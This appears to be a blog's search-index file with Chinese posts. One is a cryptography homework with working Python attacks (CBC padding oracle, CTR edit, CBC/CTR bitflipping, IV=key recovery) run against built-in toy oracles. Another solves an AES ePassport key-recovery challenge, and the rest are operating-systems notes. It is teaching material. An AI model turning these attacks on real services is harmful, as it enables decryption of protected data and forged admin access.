[{"content":" ","permalink":"http://localhost:1313/go%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/","summary":"","title":"Go逆向研究"},{"content":"CBC Padding Oracle 适用条件 已知iv 使用PKCS7来Padding 解密时检测到Padding错误会有回显 攻击过程 首先回顾CBC的解密过程：\n不难发现，当我们可以控制当前Block的上一个Ciphertext时，有以下式子：\n1 plaintext_block = AES_DEC(ciphertext_block) XOR user_controlled_value 又由于plaintext_block合法时末尾仅可能为：\n1 2 3 4 5 6 01 02 02 03 03 03 04 04 04 04 05 05 05 05 05 ... 因此，可以采用逐位试探的方法，从低位到高位，调整user_controlled_value，使得plaintext_block通过PKCS7校验。\n然后，对于当前这位，假设目前试到了01，那么有：\n1 2 3 01 = AES_DEC(ciphertext_block) XOR user_controlled_bytes =\u0026gt; real_plaintext_block = AES_DEC(ciphertext_block) XOR user_controlled_bytes XOR user_controlled_bytes XOR real_iv = 01 XOR user_controlled_bytes XOR real_iv 其它位以此类推即可。\n特殊情况 需要注意的是，还可能存在特殊情况，假设在试01的时候，这串字符串的后三位是这样的：\n1 04 04 04 ? 那么这位数最后解密的结果为01和04都能够通过PKCS7校验。遇到这种情况就要一个个试，假设是01或者04，再往后找一位，如果后一位能找到合法解，就采用当前解。\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 from utils import * from random import randint from Crypto import Random from Crypto.Cipher.AES import block_size, key_size from base64 import b64decode strings = [ \u0026#34;MDAwMDAwTm93IHRoYXQgdGhlIHBhcnR5IGlzIGp1bXBpbmc=\u0026#34;, \u0026#34;MDAwMDAxV2l0aCB0aGUgYmFzcyBraWNrZWQgaW4gYW5kIHRoZSBWZWdhJ3MgYXJlIHB1bXBpbic=\u0026#34;, \u0026#34;MDAwMDAyUXVpY2sgdG8gdGhlIHBvaW50LCB0byB0aGUgcG9pbnQsIG5vIGZha2luZw==\u0026#34;, \u0026#34;MDAwMDAzQ29va2luZyBNQydzIGxpa2UgYSBwb3VuZCBvZiBiYWNvbg==\u0026#34;, \u0026#34;MDAwMDA0QnVybmluZyAnZW0sIGlmIHlvdSBhaW4ndCBxdWljayBhbmQgbmltYmxl\u0026#34;, \u0026#34;MDAwMDA1SSBnbyBjcmF6eSB3aGVuIEkgaGVhciBhIGN5bWJhbA==\u0026#34;, \u0026#34;MDAwMDA2QW5kIGEgaGlnaCBoYXQgd2l0aCBhIHNvdXBlZCB1cCB0ZW1wbw==\u0026#34;, \u0026#34;MDAwMDA3SSdtIG9uIGEgcm9sbCwgaXQncyB0aW1lIHRvIGdvIHNvbG8=\u0026#34;, \u0026#34;MDAwMDA4b2xsaW4nIGluIG15IGZpdmUgcG9pbnQgb2g=\u0026#34;, \u0026#34;MDAwMDA5aXRoIG15IHJhZy10b3AgZG93biBzbyBteSBoYWlyIGNhbiBibG93\u0026#34;, ] class Oracle: def __init__(self, possible_inputs): self.iv = Random.new().read(block_size) self._key = Random.new().read(key_size[0]) self._possible_inputs = possible_inputs def get_encrypted_message(self): chosen_input = self._possible_inputs[randint(0, len(self._possible_inputs) - 1)].encode() return aes_cbc_encrypt(chosen_input, self._key, self.iv) def decrypt_and_check_padding(self, ciphertext, iv): plaintext = aes_cbc_decrypt(ciphertext, self._key, iv, False) return is_pkcs7_padded(plaintext) def create_forced_previous_block(iv, guessed_byte, padding_len, found_plaintext): index_of_forced_char = len(iv) - padding_len forced_character = iv[index_of_forced_char] ^ guessed_byte ^ padding_len output = iv[:index_of_forced_char] + bytes([forced_character]) m = 0 for k in range(block_size - padding_len + 1, block_size): forced_character = iv[k] ^ found_plaintext[m] ^ padding_len output += bytes([forced_character]) m += 1 return output def attack_padding_oracle(ciphertext, oracle): plaintext = b\u0026#39;\u0026#39; ciphertext_blocks = [oracle.iv] + [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)] for c in range(1, len(ciphertext_blocks)): plaintext_block = b\u0026#39;\u0026#39; for i in range(block_size - 1, -1, -1): padding_len = len(plaintext_block) + 1 possible_last_bytes = [] for j in range(256): forced_iv = create_forced_previous_block(ciphertext_blocks[c - 1], j, padding_len, plaintext_block) if oracle.decrypt_and_check_padding(ciphertext_blocks[c], forced_iv) is True: possible_last_bytes += bytes([j]) if len(possible_last_bytes) != 1: for byte in possible_last_bytes: for j in range(256): forced_iv = create_forced_previous_block(ciphertext_blocks[c - 1], j, padding_len + 1, bytes([byte]) + plaintext_block) if oracle.decrypt_and_check_padding(ciphertext_blocks[c], forced_iv) is True: possible_last_bytes = [byte] break plaintext_block = bytes([possible_last_bytes[0]]) + plaintext_block plaintext += plaintext_block return pkcs7_unpad(plaintext) def main(): for string in strings: oracle = Oracle([string]) result = attack_padding_oracle(oracle.get_encrypted_message(), oracle) print(b64decode(result.decode())) if __name__ == \u0026#39;__main__\u0026#39;: main() Break \u0026ldquo;random access read/write\u0026rdquo; AES CTR 适用条件 由于CTR模式的特性，导致CTR模式的加解密算法是相同的，同时，CTR模式是可并行化处理的，也就意味着CTR模式可以访问其中任意一个块进行加密或者解密。\n多次的加密解密 攻击过程 核心：将Ciphertext再跑一遍算法，得到的就是Plaintext。\n注意使用offset计算首块和尾块的处理细节。\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from base64 import b64decode from utils import * from Crypto import Random from Crypto.Cipher import AES class Oracle: def __init__(self) -\u0026gt; None: self._key = Random.new().read(AES.key_size[0]) def encrypt(self, plaintext): return aes_ctr(plaintext, self._key, 0) def edit(self, ciphertext, offset, new_text): start_block = int(offset / AES.block_size) end_block = int((offset + len(new_text) - 1) / AES.block_size) keystream = b\u0026#39;\u0026#39; cipher = AES.new(self._key, AES.MODE_ECB) for block in range(start_block, end_block + 1): keystream += cipher.encrypt(struct.pack(\u0026#39;\u0026lt;QQ\u0026#39;, 0, block)) key_offset = offset % AES.block_size keystream = keystream[key_offset:key_offset + len(new_text)] insert = xor_data(new_text, keystream) return ciphertext[:offset] + insert + ciphertext[offset + len(insert):] def break_random_access_read_write_aes_ctr(ciphertext, encryption_oracle): return encryption_oracle.edit(ciphertext, 0, ciphertext) def main(): with open(\u0026#34;25.txt\u0026#34;) as input_file: binary_data = b64decode(input_file.read()) plaintext = aes_ecb_decrypt(binary_data, b\u0026#39;YELLOW SUBMARINE\u0026#39;) oracle = Oracle() ciphertext = oracle.encrypt(plaintext) cracked_plaintext = break_random_access_read_write_aes_ctr(ciphertext, oracle) assert plaintext == cracked_plaintext print(cracked_plaintext.decode().rstrip()) if __name__ == \u0026#34;__main__\u0026#34;: main() CTR bitflipping 它的前身是CBC bitflipping，会CBC bitflipping，自然会这个，所以下面先讲CBC bitflipping。\n适用场景 改变字符串中的特定字符。\n场景流程 生成随机 AES 密钥。\n将填充代码和 CBC 代码结合起来编写两个函数。\n第一个函数应该接受任意输入字符串，并在字符串前面添加：\n1 comment1=cooking%20MCs;userdata= 后面添加：\n1 ;comment2=%20like%20a%20pound%20of%20bacon 该函数应该去除“;” 和“=”字符。\n然后，该函数应将输入填充为 16 字节 AES 块长度，并使用随机 AES 密钥对其进行加密。\n第二个函数应该解密字符串并查找字符“;admin=true;” 。\n根据字符串是否存在返回 true 或 false。\n攻击流程 攻击的关键在于，插入的字符串中不能含有\u0026quot;;\u0026ldquo;和\u0026rdquo;=\u0026quot;，因此只能想办法绕过。\n方法是，先将\u0026quot;?admin?true\u0026quot;加密，由于我们可以控制iv，并且已知明文为\u0026quot;?\u0026quot;，那么只需要将\n1 iv XOR \u0026#34;?\u0026#34; XOR \u0026#34;?\u0026#34;/\u0026#34;=\u0026#34; 就可以得到我们想要的解密结果。\n代码（CBC） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 from utils import aes_cbc_encrypt, aes_cbc_decrypt from Crypto import Random from Crypto.Cipher import AES class Oracle: def __init__(self): self._key = Random.new().read(AES.key_size[0]) self._iv = Random.new().read(AES.block_size) self._prefix = \u0026#34;comment1=cooking%20MCs;userdata=\u0026#34; self._suffix = \u0026#34;;comment2=%20like%20a%20pound%20of%20bacon\u0026#34; def encrypt(self, data): data = data.replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;) plaintext = (self._prefix + data + self._suffix).encode() return aes_cbc_encrypt(plaintext, self._key, self._iv) def decrypt_and_check_admin(self, ciphertext): data = aes_cbc_decrypt(ciphertext, self._key, self._iv) print(data) if b\u0026#39;;admin=true;\u0026#39; in data: print(\u0026#34;You have successfully logged in!\u0026#34;) else: print(\u0026#34;Something wrong!\u0026#34;) def cbc_bit_flip(encryption_oracle): block_length = 16 prefix_length = 32 additional_prefix_bytes = (block_length - (prefix_length % block_length)) % block_length total_prefix_length = prefix_length + additional_prefix_bytes plaintext = \u0026#34;?admin?true\u0026#34; additional_plaintext_bytes = (block_length - (len(plaintext) % block_length)) % block_length final_plaintext = additional_plaintext_bytes * \u0026#39;?\u0026#39; + plaintext ciphertext = encryption_oracle.encrypt(additional_prefix_bytes * \u0026#39;?\u0026#39; + final_plaintext) print(\u0026#34;ciphertext: \u0026#34;, ciphertext) semicolon = ciphertext[total_prefix_length - 11] ^ ord(\u0026#39;?\u0026#39;) ^ ord(\u0026#39;;\u0026#39;) equals = ciphertext[total_prefix_length - 5] ^ ord(\u0026#39;?\u0026#39;) ^ ord(\u0026#39;=\u0026#39;) forced_ciphertext = ciphertext[:total_prefix_length - 11] + bytes([semicolon]) + \\ ciphertext[total_prefix_length - 10: total_prefix_length - 5] + \\ bytes([equals]) + ciphertext[total_prefix_length - 4:] return forced_ciphertext def main(): encryption_oracle = Oracle() forced_ciphertext = cbc_bit_flip(encryption_oracle) encryption_oracle.decrypt_and_check_admin(forced_ciphertext) if __name__ == \u0026#39;__main__\u0026#39;: main() 代码（CTR） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 from utils import aes_ctr, xor_data from Crypto import Random from Crypto.Cipher import AES from random import randint class Oracle: def __init__(self): self._key = Random.new().read(AES.key_size[0]) self._nonce = randint(0, 2 ** 32 - 1) self._prefix = \u0026#34;comment1=cooking%20MCs;userdata=\u0026#34; self._suffix = \u0026#34;;comment2=%20like%20a%20pound%20of%20bacon\u0026#34; def encrypt(self, data): data = data.decode().replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;) plaintext = (self._prefix + data + self._suffix).encode() return aes_ctr(plaintext, self._key, self._nonce) def decrypt_and_check_admin(self, ciphertext): data = aes_ctr(ciphertext, self._key, self._nonce) print(data) if b\u0026#39;;admin=true;\u0026#39; in data: print(\u0026#34;You have successfully logged in!\u0026#34;) else: print(\u0026#34;Something wrong!\u0026#34;) def ctr_bit_flip(encryption_oracle): block_length = 16 prefix_length = 32 plaintext = b\u0026#34;?admin?true\u0026#34; ciphertext = encryption_oracle.encrypt(plaintext) goal_text = b\u0026#39;;admin=true\u0026#39; insert = xor_data(plaintext, goal_text) forced_ciphertext = ciphertext[:prefix_length] + \\ xor_data(ciphertext[prefix_length:prefix_length + len(plaintext)], insert) + \\ ciphertext[prefix_length + len(plaintext):] return forced_ciphertext def main(): encryption_oracle = Oracle() forced_ciphertext = ctr_bit_flip(encryption_oracle) encryption_oracle.decrypt_and_check_admin(forced_ciphertext) if __name__ == \u0026#39;__main__\u0026#39;: main() Recover the key from CBC with IV=Key 参考链接\n前提条件 加密程序使用相同的IV和KEY 解密失败时，服务器抛出错误，并将解码的消息反映给攻击者 攻击流程 制作长度至少为3个块大小的明文 加密明文，得到密文 让密文的第二个块全0 让密文的第三个块和第一个块一样 解密该密文，得到认证失败的明文 将第一段得到的明文和第三段得到的明文XOR 得到KEY！ 1 2 3 4 first_block_ciphertext = AES_Decrypt(first_block_ciphertext, KEY) XOR KEY third_block_ciphertext = AES_Decrypt(first_block_ciphertext, KEY) XOR second_block_ciphertext =\u0026gt; KEY = AES_Decrypt(first_block_ciphertext, KEY) XOR KEY XOR AES_Decrypt(third_block_ciphertext, KEY) XOR second_block_ciphertext 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from utils import * from Crypto import Random class Oracle: def __init__(self): self._key = Random.new().read(AES.key_size[0]) self._iv = self._key self._prefix = \u0026#34;comment1=cooking%20MCs;userdata=\u0026#34; self._suffix = \u0026#34;;comment2=%20like%20a%20pound%20of%20bacon\u0026#34; def encrypt(self, data): data = data.replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;=\u0026#39;, \u0026#39;\u0026#39;) plaintext = (self._prefix + data + self._suffix).encode() return aes_cbc_encrypt(plaintext, self._key, self._iv) def decrypt_and_check_admin(self, ciphertext): plaintext = aes_cbc_decrypt(ciphertext, self._key, self._iv) if not all(c \u0026lt; 128 for c in plaintext): raise Exception(\u0026#34;The message is not valid\u0026#34;, plaintext) if b\u0026#39;;admin=true;\u0026#39; in plaintext: print(\u0026#34;You have successfully logged in!\u0026#34;) else: print(\u0026#34;Something wrong!\u0026#34;) def get_key_from_insecure_cbc(encryption_oracle): block_length = 16 prefix_length = 32 p_1 = \u0026#39;A\u0026#39; * block_length p_2 = \u0026#39;B\u0026#39; * block_length p_3 = \u0026#39;C\u0026#39; * block_length ciphertext = encryption_oracle.encrypt(p_1 + p_2 + p_3) forced_ciphertext = ciphertext[prefix_length:prefix_length + block_length] + b\u0026#39;\\x00\u0026#39; * block_length + \\ ciphertext[prefix_length:prefix_length + block_length] try: encryption_oracle.decrypt_and_check_admin(forced_ciphertext) except Exception as e: forced_plaintext = e.args[1] return xor_data(forced_plaintext[:block_length], forced_plaintext[-block_length:]) raise Exception(\u0026#34;Was not able to hack the key\u0026#34;) def main(): encryption_oracle = Oracle() hacked_key = get_key_from_insecure_cbc(encryption_oracle) if encryption_oracle._key == hacked_key: print(\u0026#34;Hacked!\u0026#34;) else: print(\u0026#34;Something Wrong!\u0026#34;) assert encryption_oracle._key == hacked_key if __name__ == \u0026#39;__main__\u0026#39;: main() ","permalink":"http://localhost:1313/posts/cryptography-programing-homework1/","summary":"CBC Padding Oracle 适用条件 已知iv 使用PKCS7来Padding 解密时检测到Padding错误会有回显 攻击过程 首先回顾CBC的解密过程： 不难发现，当我们","title":"现代密码学 大作业 1"},{"content":"题目大意 你收到了一个AES加密的消息（使用CBC模式，零初始化向量和01-00填充）。此外，你还收到了相应的密钥，但不幸的是，密钥的形式并不完整，类似于身份文件上的机器可读区域（MRZ），就像在欧洲使用的电子护照中一样。\n1 12345678\u0026lt;8\u0026lt;\u0026lt;\u0026lt;1110182\u0026lt;111116?\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;4 现在需要你恢复出密钥，并用恢复出的密钥解密以下文本：\n1 9MgYwmuPrjiecPMx61O6zIuy3MtIXQQ0E59T3xB6u0Gyf1gYs2i3K9Jxaa0zj4gTMazJuApwd6+jdyeI5iGHvhQyDHGVlAuYTgJrbFDrfB22Fpil2NfNnWFBTXyf7SDI 参考资料：\nhttps://www.icao.int/publications/pages/publication.aspx?docnum=9303\nhttps://github.com/Joel-Q-Xu/MT3-mysterytwisterc3\nStep1 恢复？处信息 1 2 3 4 5 6 7 8 9 # 第一步, 破解\u0026#34;?\u0026#34;处的字符 array = [1, 1, 1, 1, 1, 6] weights = [7, 3, 1, 7, 3, 1] question_mark = 0 for i in range(len(array)): question_mark += array[i] * weights[i] question_mark %= 10 print(question_mark) //7 Step2 恢复MRZ_INFORMATION与K_SEED 1 2 3 4 5 6 7 8 9 10 # 第二步 恢复MRZ_INFORMATION与K_SEED from hashlib import sha1 passport = \u0026#39;12345678\u0026lt;8\u0026lt;\u0026lt;\u0026lt;1110182\u0026lt;1111167\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;4\u0026#39; no = passport[:10] birth = passport[13:20] arrive = passport[21:28] mrz = no+birth+arrive h_mrz = sha1(mrz.encode()).hexdigest() k_seed = h_mrz[:32] print(k_seed) Step3 由K_SEED解出K_a, K_b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def adjusting_the_parity_bit(x): ans = [] tmp = bin(int(x, 16))[2:] # 将输入参数x解析为16进制，并转换为二进制表示形式。 # 然后，将二进制表示中的前缀\u0026#34;0b\u0026#34;去除，得到一个二进制字符串tmp。 for i in range(0, len(tmp), 8): if tmp[i:i+7].count(\u0026#39;1\u0026#39;) % 2 == 0: ans.append(tmp[i:i+7] + \u0026#39;1\u0026#39;) else: ans.append(tmp[i:i+7] + \u0026#39;0\u0026#39;) ans = hex(int(\u0026#39;\u0026#39;.join(ans), 2)) # 将结果列表ans中的二进制字符串连接起来，并将其转换为十六进制表示形式。 return ans[2:] # 返回调整后的结果，去除十六进制表示中的前缀\u0026#34;0x\u0026#34;。 c = \u0026#39;00000001\u0026#39; D = k_seed + c H = sha1(bytes.fromhex(D)).hexdigest() K_a = adjusting_the_parity_bit(H[:16]) K_b = adjusting_the_parity_bit(H[16:32]) key = K_a+K_b # ea8645d97ff725a898942aa280c43179 Step4 由生成的Key解出明文 1 2 3 4 5 6 7 8 9 10 from Crypto.Cipher import AES import base64 cipher = \u0026#39;9MgYwmuPrjiecPMx61O6zIuy3MtIXQQ0E59T3xB6u0Gyf1gYs2i3K9Jxaa0zj4gTMazJuApwd6+jdyeI5iGHvhQyDHGVlAuYTgJrbFDrfB22Fpil2NfNnWFBTXyf7SDI\u0026#39; cipher = base64.b64decode(cipher) aes = AES.new(bytes.fromhex(key),AES.MODE_CBC,bytes.fromhex(\u0026#39;0\u0026#39;*32)) result = aes.decrypt(cipher).decode() print(result) # Herzlichen Glueckwunsch. Sie haben die Nuss geknackt. Das Codewort lautet: Kryptographie! 总结 这次作业不仅仅是针对某一种加解密算法的攻击，而是让我体验到了现实中的密钥加解密标准，受益匪浅。\n","permalink":"http://localhost:1313/posts/mysterytwisterc3-challenge-AES/","summary":"题目大意 你收到了一个AES加密的消息（使用CBC模式，零初始化向量和01-00填充）。此外，你还收到了相应的密钥，但不幸的是，密钥的形式并不","title":"mysterytwisterc3-challenge-AES key — encoded in the machine readable zone of a European ePassport"},{"content":"系统调用消息传递 系统调用是用户程序和操作系统内核之间的接口，用于向内核发出请求，获取系统资源和执行特权操作。系统调用通常需要传递一些参数，以告知内核需要执行的具体操作和相关数据。常见的系统调用参数传递方法有以下几种：\n寄存器传递：一些系统调用参数可以直接通过CPU寄存器传递。例如，在x86架构中，系统调用号通常存储在eax寄存器中，其他参数则存储在ebx、ecx、edx等寄存器中。\n栈传递：一些系统调用参数无法通过寄存器传递，需要通过栈来传递。在栈传递中，用户程序会将系统调用参数压入栈中，然后调用相应的系统调用函数。内核会从栈中提取参数，并根据参数执行相应的操作。\n共享内存传递：在一些需要传递大量数据的系统调用中，使用栈传递可能会导致栈溢出或性能下降。此时可以使用共享内存传递参数，即在用户程序和内核之间共享一块内存区域，用户程序将参数写入共享内存中，内核从共享内存中读取参数并执行相应的操作。\n端口传递：在一些特定的硬件平台上，可以使用端口传递方式来传递系统调用参数。在端口传递中，用户程序将参数写入指定的端口，在内核中通过相应的端口地址读取参数。\n总的来说，系统调用参数的传递方式可以根据具体的操作系统和硬件平台来选择合适的方法。不同的传递方式各有优缺点，需要根据实际需求进行选择和权衡。\n过程调用与系统调用 过程调用和系统调用都是程序中常用的调用方式，但它们的作用、实现和使用方式各不相同。\n过程调用 过程调用是指在程序中调用另外一个子程序（函数或过程）的过程。过程调用通常是在用户程序内部进行的，可以通过栈来传递参数和返回值。过程调用的主要目的是将程序分解成多个独立的模块，方便代码的编写和维护。过程调用的实现通常由编译器或解释器负责，不需要操作系统的支持。\n系统调用 系统调用是指在程序中向操作系统内核发出请求，获取系统资源和执行特权操作的过程。系统调用通常是在用户程序和操作系统内核之间进行的，需要操作系统的支持。系统调用可以完成一些用户程序无法完成的特权操作，例如读写磁盘、访问网络、修改系统时间等。系统调用的实现需要使用特定的指令和机制，例如中断、陷阱、系统调用表等。\n总的来说，过程调用和系统调用在调用方式、作用和实现上都有一定的差异。过程调用主要用于程序内部的模块化设计和实现，而系统调用主要用于访问操作系统内核提供的特权操作和系统资源。在实际应用中，程序员需要根据具体的需求和场景来选择合适的调用方式。\n操作系统结构 操作系统结构是指操作系统的组织形式和内部模块之间的关系。常见的操作系统结构包括单体内核、分层结构、微内核等。\n单体内核结构 单体内核是指将操作系统的所有模块集中在一个单一的内核中，包括进程管理、内存管理、文件系统等，所有的模块都运行在同一个地址空间中。单体内核结构的优点是简单、高效、易于实现和调试，但是缺点是模块之间的耦合度较高，系统扩展性较差，容易出现内核崩溃和安全漏洞。\n分层结构 分层结构是指将操作系统的不同模块分层，每一层都提供一个特定的抽象接口，上层模块通过接口调用下层模块的功能。分层结构的优点是模块之间的耦合度较低，系统扩展性较好，容易实现模块的独立性和可移植性，但是缺点是层次结构较为复杂，模块之间的接口调用会导致额外的性能开销。\n微内核结构 微内核是指将操作系统的核心功能和基本服务抽象出来，实现在微内核中，而将其他功能和服务实现为独立的用户进程，通过进程间通信来完成各种操作。微内核结构的优点是模块化程度高，易于扩展和维护，能够保证系统的稳定性和安全性，但是缺点是模块之间的通信会导致额外的性能开销，实现复杂度较高。\n总的来说，操作系统结构的选择需要根据具体的需求和场景来进行权衡。微内核结构具有很强的模块化和可扩展性，是一种现代操作系统结构的重要实现方式。\n程序 VS 进程 程序和进程是计算机中常见的两个概念，它们有一些共同点，但也有明显的区别。\n程序 程序是指存储在计算机磁盘上的可执行代码，是一组指令的集合。程序通常被编译成机器代码，可以在计算机上运行。程序本身是静态的，不会占用计算机的CPU和内存资源，只有在被调用执行时才会占用这些资源。\n进程 进程是指正在运行的程序的实例，是一段正在执行的代码和数据的集合。进程是动态的，它需要占用计算机的CPU、内存和其他资源，可以执行多个任务和线程。每个进程都有自己的内存空间、寄存器、栈等资源，可以独立地执行任务，与其他进程隔离开来。\n区别：\n程序是静态的，进程是动态的。 程序只是存储在磁盘上的可执行代码，进程是正在运行的程序的实例。 程序不占用计算机的CPU和内存资源，进程需要占用这些资源。 程序只有一个，进程可以有多个实例。 程序不能执行多个任务和线程，进程可以执行多个任务和线程。 总的来说，程序和进程虽然有一些相似之处，但是它们的本质和作用是不同的，程序是执行的指令集合，而进程则是正在执行的程序的实例，它需要占用计算机资源并可以执行多个任务和线程。\n僵尸进程与孤儿进程 僵尸进程和孤儿进程是操作系统中的两种进程状态，它们分别表示不同的进程状态。\n僵尸进程 当一个进程完成执行后，它的状态会变成“僵尸进程”状态，这时它已经不能执行任何操作，但是进程控制块（PCB）和其他资源仍然存在于系统中。僵尸进程通常是由于父进程没有及时回收子进程的资源而导致的。僵尸进程会占用系统资源，如果系统中存在大量的僵尸进程，会导致系统性能下降。\n孤儿进程 孤儿进程是指父进程已经退出，但是子进程仍然在运行的进程。孤儿进程通常是由于父进程异常终止或者没有正确回收子进程资源而导致的，这时子进程会成为孤儿进程。孤儿进程会被init进程接管，并成为init进程的子进程。因为孤儿进程没有父进程，所以它的父进程ID会被设置成1，即init进程的进程ID。\n总的来说，僵尸进程和孤儿进程都是进程状态中的异常情况。如果系统中存在大量的僵尸进程或孤儿进程，会导致系统性能下降，因此需要及时处理这些进程，回收它们的资源。\n直接消息传递与间接消息传递 直接消息传递和间接消息传递是消息传递机制中的两种不同的实现方式。\n直接消息传递 在直接消息传递中，发送进程直接将消息发送给接收进程，发送进程和接收进程之间需要建立一个直接的通信通道，这个通道可以是管道、共享内存等。直接消息传递的特点是实现简单、速度快，但是通道容易受到网络延迟、带宽等因素的影响，同时需要进行同步和互斥操作以避免数据冲突和竞态条件。\n间接消息传递 在间接消息传递中，发送进程将消息发送给一个中间进程，中间进程再将消息传递给接收进程。中间进程通常是一个系统进程或系统服务，它负责接收来自发送进程的消息，并将消息转发给接收进程。间接消息传递的特点是可靠性高、安全性强，因为中间进程可以对消息进行检查和过滤，同时可以进行流量控制、错误检测等操作，但是实现复杂，需要考虑进程间的安全性和可靠性问题。\n总的来说，直接消息传递和间接消息传递都是消息传递机制中常见的实现方式，两者各自具有优点和缺点，需要根据具体的应用场景来选择合适的方式。直接消息传递适合于速度快、数据量小的场景，而间接消息传递适合于大量数据传输、安全性高、可靠性要求高的场景。\n匿名管道与命名管道 匿名管道和命名管道（FIFO）都是进程间通信机制中的一种，它们有一些相似之处，但也有一些不同。\n匿名管道 匿名管道是一种进程间通信机制，它可以在两个相关进程之间传递数据。匿名管道是一种半双工通信方式，即数据只能在一个方向上传输。匿名管道是由操作系统创建和管理的，它只能用于具有亲缘关系的进程之间通信，例如父进程和子进程之间。匿名管道的优点是实现简单、易于使用，但是它只能在两个进程之间传递数据，而且数据传输是单向的。\n命名管道（FIFO） 命名管道（FIFO）是一种具有名称的管道，它可以在不相关的进程之间传递数据。命名管道是一种半双工通信方式，和匿名管道类似，数据只能在一个方向上传输。命名管道可以像文件一样被打开和关闭，它可以被多个进程共享，从而实现多个进程之间的通信。命名管道的优点是可以在不相关进程之间进行通信，而且实现比较灵活，但是需要考虑进程并发访问的问题，同时需要进行同步和互斥操作以避免数据冲突和竞态条件。\n总的来说，匿名管道和命名管道都是进程间通信机制中常见的实现方式，它们各自具有优点和缺点，需要根据具体的应用场景来选择合适的方式。如果只需要在两个具有亲缘关系的进程之间传递数据，可以选择匿名管道；如果需要在不相关进程之间进行通信，可以选择命名管道。\n数据并行与任务并行 数据并行和任务并行是并行计算中的两种常见的并行方式，它们分别适用于不同的并行计算场景。\n数据并行 数据并行是指将一个计算任务分成多个子任务，每个子任务处理不同的数据子集，从而加速计算过程。数据并行通常用于需要处理大量数据的计算任务，例如图像处理、数据挖掘、机器学习等领域。数据并行的优点是可以充分利用多核CPU和GPU等硬件资源，同时可以提高计算效率和吞吐量，但是需要考虑数据之间的依赖关系和通信开销。\n任务并行 任务并行是指将一个计算任务分成多个子任务，每个子任务处理不同的计算步骤或者不同的计算函数，从而加速计算过程。任务并行通常用于需要处理复杂计算任务的场景，例如大规模模拟、数值计算、图形渲染等领域。任务并行的优点是可以充分利用多台计算机或者多个处理器，同时可以提高计算效率和可伸缩性，但是需要考虑任务之间的依赖关系和通信开销。\n总的来说，数据并行和任务并行都是并行计算中常见的实现方式，它们各自适用于不同的计算场景。如果需要处理大量数据的计算任务，可以选择数据并行；如果需要处理复杂计算任务，可以选择任务并行。在实际应用中，通常需要综合考虑数据并行和任务并行的优缺点，选择合适的并行计算策略。\n用户线程与内核线程 用户线程和内核线程都是操作系统中的线程实现方式，它们在实现方式、调度方式和性能等方面有一些区别。\n用户线程 用户线程是由用户程序或者用户级别的库函数实现的线程，它们的创建、调度和管理都由用户程序或者用户级别的库函数完成。用户线程与操作系统内核没有直接关系，它们只是在操作系统的进程上下文中运行。用户线程的优点是实现简单、灵活性高，可以根据需要动态创建、销毁和调度线程，但是它们的并发性受到操作系统进程调度的限制，无法利用多核CPU的性能优势。\n内核线程 内核线程是由操作系统内核实现的线程，它们的创建、调度和管理都由操作系统内核完成。内核线程与操作系统内核直接关联，可以利用操作系统的多任务调度机制实现线程的并发执行。内核线程的优点是可以利用操作系统的多任务调度机制，充分利用多核CPU的性能优势，但是实现较为复杂，需要考虑线程的同步、互斥和调度等问题。\n总的来说，用户线程和内核线程都是操作系统中的线程实现方式，它们各自具有优点和缺点，需要根据具体的应用场景来选择合适的线程实现方式。如果需要实现简单、灵活性高的线程，可以选择用户线程；如果需要实现高并发、高性能的线程，可以选择内核线程。在实际应用中，通常需要综合考虑线程的实现方式、调度策略和性能等因素，选择合适的线程实现方式。\n线程模型 线程模型是指操作系统中线程的实现方式，常见的线程模型包括多对一模型、一对一模型和多对多模型。\n多对一模型 多对一模型是指多个用户线程共享一个内核线程，多个用户线程通过库函数或者系统调用来访问内核线程，内核线程负责调度和管理所有的用户线程。多对一模型的优点是实现简单、轻量级，不需要频繁的上下文切换和线程切换，但是由于所有的用户线程共享一个内核线程，如果某个用户线程阻塞或者发生异常，会影响所有的用户线程。\n一对一模型 一对一模型是指每个用户线程对应一个内核线程，每个用户线程通过库函数或者系统调用来访问相应的内核线程，内核线程负责调度和管理对应的用户线程。一对一模型的优点是每个用户线程都有独立的内核线程，不会相互影响，同时可以利用操作系统的多任务调度机制实现线程的并发执行，但是由于每个用户线程都需要一个对应的内核线程，线程的创建和销毁开销较大。\n多对多模型 